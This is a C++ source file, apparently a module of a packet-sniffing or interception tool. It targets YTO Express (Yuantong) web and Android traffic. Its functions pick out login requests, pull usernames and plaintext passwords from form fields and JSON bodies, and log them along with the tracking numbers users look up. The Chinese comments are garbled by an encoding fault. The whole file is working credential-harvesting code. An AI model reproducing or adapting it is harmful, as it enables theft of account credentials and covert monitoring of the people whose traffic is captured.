
#include "StdAfx.h"

#include "YuanTong.h"

kuaidi::Yuantong::Yuantong(HttpSession *http_session, const string &pro_name) : KuaiDi(http_session,pro_name)
{
	
}

kuaidi::Yuantong::~Yuantong()
{
	
}

int kuaidi::Yuantong::IsYuanTong(HttpSession *http_session)
{
	//pc ��¼
	if((http_session->m_Requestline.m_Host.Find("ec.yto.net.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/loginCheck.htm")!=-1))
	{
		return kPCLogin;
	}
	//pc ��ѯ δ��¼
	if((http_session->m_Requestline.m_Host.Find("trace.yto.net.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("TraceSimple")!=-1))
	{
		return kYuanTong;
	}
	//pc ��ѯ ��¼��
	if((http_session->m_Requestline.m_Host.Find("ec.yto.net.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/order/trace.htm")!=-1))
	{
		return kPCDingdan;
	}
	//android ��¼����ѯ����
	if((http_session->m_Requestline.m_Host.Find("116.228.70.203:7800")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/rest.htm")!=-1))
	{
		return kAndroidLogin;
	}
	return 0;
}

int kuaidi::Yuantong::Process(const char *packet,int action)
{
	//pc ��¼
	if (action == kPCLogin)
	{
		return PCLogin(packet);
	}
	//pc ��ѯ δ��¼
	if (action==kYuanTong)
	{
		return YuanTong(packet);
	}
	//pc ��ѯ ��¼��
	if (action == kPCDingdan)
	{
		return PCDingdan(packet);
	}
	//Android ��¼ ��ѯ
	if (action==kAndroidLogin)
	{
		return AndroidLogin(packet);
	}
	return 1;
}

//pc ��ѯ δ��¼
int kuaidi::Yuantong::YuanTong(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	hd=ms_->GetValueBetweenBeginEnd(src_data,"waybillNo=","&");
	if (hd.empty())
	{
		return 0;
	}
	//�������  aaa/bbbb/bbbb
	string srcSouce = hd;
	string split= "/";
	int start=0;
	int end = 0;
	string tmp;
	while(1)
	{
		end = srcSouce.find(split,start);
		if (end == string::npos)
		{
			if (start == string::npos)
			{
				break;
			}
			else
			{
				tmp = srcSouce.substr(start);
				start =string::npos;
				output_text_ = 
					"servername=" + tmp + "\r\n" +
					"state=��ѯ\r\n";
					WriteIndexFile();
			}
		}
		else
		{
			tmp = srcSouce.substr(start,end-start);
			start = end + split.length();
			output_text_ = 
				"servername=" + tmp + "\r\n" +
				"state=��ѯ\r\n";
				WriteIndexFile();
		}
	}
	return 1;
}

//pc ��ѯ ��¼��
int kuaidi::Yuantong::PCDingdan(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	string mialno = "mailno=";
	int n = src_data.find(mialno);
	if (n==string::npos)
	{
		return 0;
	}
	hd = src_data.substr(n+mialno.length());
	if (hd.empty())
	{
		return 0;
	}
	output_text_ = 
		"servername=" + hd + "\r\n" +
		"state=��ѯ\r\n";
	WriteIndexFile();
	return 1;
}

//pc ��¼
int kuaidi::Yuantong::PCLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueBetweenBeginEnd(src_data,"username=","&");
	string pass = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || pass.empty())
	{
		return 0;
	}
	output_text_ =  
		"user=" + username + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}


//Android��¼ ��ѯ
int kuaidi::Yuantong::AndroidLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	//��ȷ��ȡ����
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	string data = ms_->GetValueFromMapByKey("data",true);
    //�ж���¼ ��ѯ
    string code = ms_->GetValueFromMapByKey("code",true);

	string typeTrace = "m.order.trace";
	string typeLogin = "m.user.login";

	if (code.find(typeLogin) != string::npos)
	{
		//ʹ��json ��ȡ����
		Json::Reader reader;
		Json::Value value;
		string username,pass;
		if (reader.parse(data,value))
		{
			username = value["username"].asString();
			pass = value["password"].asString();
		}
		if (username.empty() || pass.empty())
		{
			return 0;
		}
		output_text_ =  
			"user=" + username + "\r\n" + 
			"pass=" + pass + "\r\n" + 
			"state=��¼\r\n";
		WriteIndexFile();
	}
	if (code.find(typeTrace) != string::npos)
	{
		//ʹ��json ��ȡ����
		Json::Reader reader;
		Json::Value value;
		if (reader.parse(data,value))
		{
			const Json::Value mailnos = value["mailnos"];
			for (int j = 0;j <mailnos.size();j++)
			{
				hd = mailnos[j].asString();
				if (hd.empty())
				{
					return 0;
				}
				output_text_ = 
					"servername=" + hd + "\r\n" +
					"state=��ѯ\r\n";
				WriteIndexFile();
			}
		}
	}
	return 1;
}